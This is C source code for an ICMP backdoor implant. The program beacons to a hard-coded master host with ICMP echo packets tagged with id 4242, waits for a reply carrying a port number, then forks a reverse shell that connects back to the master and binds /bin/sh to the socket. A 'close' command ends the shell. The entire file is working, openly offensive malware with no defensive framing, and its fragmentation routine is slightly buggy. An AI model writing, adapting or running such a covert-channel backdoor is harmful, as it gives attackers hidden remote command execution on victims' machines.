#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/ip_icmp.h>
#include <sys/time.h>
#include <netdb.h>
#include <stdlib.h>
#include <string.h>
#include <stdio.h>
#include <errno.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <signal.h>
#define PACKET_SIZE 1500 // MTU
#define MAX_PAYLOAD_SIZE 1472
#define CODE_REQUEST 4242
#define MASTER_ADDR "127.0.0.1"
#define PING_SLEEP_RATE 1000000
#define SHELL "/bin/sh"
#define SHELLNAME	"icmp-backdoor-shell"

#define STACKS (2048*2048)



static unsigned short cal_chksum(unsigned short *addr,int len)
{
	int nleft=len;
	int sum=0;
	unsigned short *w=addr;
	unsigned short answer=0;

	while(nleft>1)
	{
		sum+=*w++;
		nleft-=2;
	}

	if( nleft==1){
		*(unsigned char *)(&answer)=*(unsigned char *)w;
		sum+=answer;
	}

	sum=(sum>>16)+(sum&0xffff);
	sum+=(sum>>16);
	answer=~sum;

	return answer;
}

/*
 * Prepare the ICMP packet
 * */
static int pack(struct icmp *packet, void *data, unsigned short len, unsigned int pack_no, unsigned int code){       
	
	packet->icmp_type=ICMP_ECHO;        
	packet->icmp_code = 8; // PING echo reuquest        
	packet->icmp_seq = pack_no; 
	packet->icmp_id = code; // in order to filter on the master side
	// ICMP header size is 8 bytes long 
	unsigned int packsize = 8+len;      
	packet->icmp_cksum = 0;        	
	memcpy(packet->icmp_data, (char *) data, len);
	// Get checksum
	packet->icmp_cksum = cal_chksum((unsigned short *)packet, packsize);         
	return packsize;
}

/*
 * Unpack an ICMP echo reply
 */
static int unpack(char *buf, int len, char *bufret) {
	struct ip *ip;	
	int iphdrlen;        
	struct icmp *icmp;
	ip=(struct ip *)buf;
	iphdrlen=ip->ip_hl<<2;

	icmp=(struct icmp *)(buf+iphdrlen); // go at offset the size of the ip header -> icmp header

	len-=iphdrlen;
	if(len<8)
	{
		fprintf(stderr, "ICMP packets\'s length is less than 8\n");
		return -1;
	}
	if(icmp->icmp_id==4243 && icmp->icmp_type == 0)
	{	
		memcpy(bufret, (char*)icmp->icmp_data, len); 
		return 1;
	}
	else{
		return -1;
	}

}

static int recv_packet(int sockfd, struct sockaddr_in *from, char *buff) {
	
	int n;
	unsigned int fromlen=sizeof(struct sockaddr_in);
	char recvpacket[PACKET_SIZE];
	// recieve
    	if ((n=recvfrom(sockfd, recvpacket, MAX_PAYLOAD_SIZE, 0, (struct sockaddr *) from, &fromlen))<0){
        	if(errno==EINTR)  printf("recvfrom error");
    	}
   	// unpack
	return unpack(recvpacket, n, buff);

}

/*
 * Spawn a shell and connect stdout 
 */

static void spawn_shell(uint16_t port) { 	
	
	printf(" YES %d\n", port);	
	int client;
  	struct sockaddr_in shell;
 	shell.sin_family = AF_INET;
  	shell.sin_port = htons(port);
  	shell.sin_addr.s_addr = inet_addr(MASTER_ADDR);
  	
	if ((client = socket(AF_INET, SOCK_STREAM, IPPROTO_IP)) == -1){
		fprintf(stderr, "Socket openin shell %s\n", strerror(errno));
	}
  	if(connect(client, (struct sockaddr *)&shell, sizeof(shell))<0){
		fprintf(stderr, "Socket connecting  %s\n", strerror(errno));
		exit(-1);
	}

  	printf("All good\n");
  	close(STDIN_FILENO);
  	close(STDOUT_FILENO);
  	close(STDERR_FILENO);
	dup2(client, STDERR_FILENO);
	dup2(client, STDIN_FILENO);
	dup2(client, STDOUT_FILENO);
	execl(SHELL, SHELLNAME, NULL);

}
/*
 * Send the ICMP packet
 */
static void send_packet(int sockfd, struct sockaddr_in *dest_addr, void *data, unsigned short len, unsigned int pack_no, unsigned int code){
	int packetsize;
    	struct icmp packet;
	packetsize=pack(&packet, data, len, pack_no, code);
	if(sendto(sockfd, &packet, packetsize, 0, (struct sockaddr *)dest_addr, sizeof(*dest_addr)) < 0){
       		fprintf(stderr, "Error sending packet - %s\n" , strerror(errno)); 
	}
}

/*
 *Send the data to the dest. Fragmentation if len > MAX_FRAGMENT_SIZE 
 */

static void send_data(int sockfd, void *data, unsigned int len, struct sockaddr_in *dest, unsigned int code){
	char *buff = (char *)malloc(MAX_PAYLOAD_SIZE*sizeof(char));
	int lentmp = len;
	unsigned int pack_n = 1;
	if(lentmp > MAX_PAYLOAD_SIZE){
		while(lentmp > MAX_PAYLOAD_SIZE){ 	
			memset(buff, 0x00, MAX_PAYLOAD_SIZE);
			memcpy(buff, data, MAX_PAYLOAD_SIZE);
			lentmp -= MAX_PAYLOAD_SIZE;	
			send_packet(sockfd, dest, buff, MAX_PAYLOAD_SIZE-8, pack_n++, code);
		}	
	}
	// last packet or first packet
	if(lentmp){
		memset(buff, '\0', MAX_PAYLOAD_SIZE);
		memcpy(buff, (char*)data, lentmp);
		send_packet(sockfd, dest,  buff, lentmp, pack_n++, code);
		}	
	free(buff);	
}
	

/*
* Open a socket and init the dest structure
*/
static void initialize_addr_dest(struct sockaddr_in *dest){
    
       dest->sin_family = AF_INET;
       dest->sin_addr.s_addr = inet_addr(MASTER_ADDR);
}


int main(void){
	
	int sockfd;
	struct sockaddr_in dest;
	char buff[MAX_PAYLOAD_SIZE];	
	int shell=0;
	pid_t pid=0;	
       	//Create Raw ICMP Socket
       	if((sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_ICMP))<0){
	       fprintf(stderr, "Failed to open raw icmp socket %s\n", strerror(errno));
	       exit(EXIT_FAILURE);
       }
       // socket initialization 
       struct timeval tv_out;
       tv_out.tv_sec = 1;
      	tv_out.tv_usec = 0;  
      	setsockopt(sockfd, SOL_SOCKET, SO_RCVTIMEO, (const char*)&tv_out, sizeof tv_out);	
      	initialize_addr_dest(&dest);	
     	int res, port;
	printf("\nConnecting to master...\n");
	while(1) {
		memset(buff, 0x00, MAX_PAYLOAD_SIZE);
		send_data(sockfd, "", 1, &dest, 4242);
		usleep(PING_SLEEP_RATE);
		// wait to recieve
		res = recv_packet(sockfd, &dest, buff);
		if(res != -1){
			if ((!strcmp(buff, "close")) && pid){
				kill(pid, SIGINT);
			}else {
				port = atoi(buff);
				if(!(pid=fork())){	
					spawn_shell(port);
				}
			}
		}
	}
	return 0;
}
